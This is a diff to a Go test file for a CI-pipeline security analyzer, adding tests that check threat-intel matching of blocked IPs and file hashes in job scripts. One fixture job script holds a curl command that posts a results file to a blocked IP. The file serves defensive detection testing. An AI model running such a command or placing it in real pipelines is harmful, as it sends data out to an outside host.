@@ -3,6 +3,7 @@ package analyze
 import (
 	"testing"
 
+	"github.com/mr-pmillz/gogatoz/pkg/config"
 	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
 )
 
@@ -147,5 +148,63 @@ func TestSuspiciousNetwork_IPFS(t *testing.T) {
 	}
 	if !hasFindingID(findings, SuspiciousNetworkID) {
 		t.Fatalf("expected %s finding for IPFS gateway", SuspiciousNetworkID)
+	}
+}
+
+func TestSuspiciousNetwork_ThreatIntelBlockedIP(t *testing.T) {
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "callback",
+			Script: []string{`curl https://10.20.30.40/collect -d @results.json`},
+		}},
+	}
+	feed := &config.ThreatIntelFeed{BlockedIPs: []string{"10.20.30.40"}}
+
+	findings, err := Run(doc, WithThreatIntel(feed))
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if !hasFindingID(findings, SuspiciousNetworkID) {
+		t.Fatalf("expected %s finding for feed-blocked IP", SuspiciousNetworkID)
+	}
+}
+
+func TestSuspiciousNetwork_ThreatIntelBlockedHash(t *testing.T) {
+	const blockedHash = "d2a84f4b8b650937ec8f73cd8be2c74add5a911ba64df27458ed8229da804a26"
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name: "verify",
+			Script: []string{
+				`printf '%s  artifact.bin\n' ` + blockedHash + ` | sha256sum --check`,
+			},
+		}},
+	}
+	feed := &config.ThreatIntelFeed{BlockedHashes: []string{blockedHash}}
+
+	findings, err := Run(doc, WithThreatIntel(feed))
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if !hasFindingID(findings, CampaignMatchID) {
+		t.Fatalf("expected %s finding for feed-blocked hash", CampaignMatchID)
+	}
+}
+
+func TestSuspiciousNetwork_ThreatIntelHashRequiresTokenBoundary(t *testing.T) {
+	const blockedHash = "d2a84f4b8b650937ec8f73cd8be2c74add5a911ba64df27458ed8229da804a26"
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "log",
+			Script: []string{`echo prefix` + blockedHash + `suffix`},
+		}},
+	}
+	feed := &config.ThreatIntelFeed{BlockedHashes: []string{blockedHash}}
+
+	findings, err := Run(doc, WithThreatIntel(feed))
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if hasFindingID(findings, CampaignMatchID) {
+		t.Fatalf("did not expect %s for a hash embedded inside a larger token", CampaignMatchID)
 	}
 }
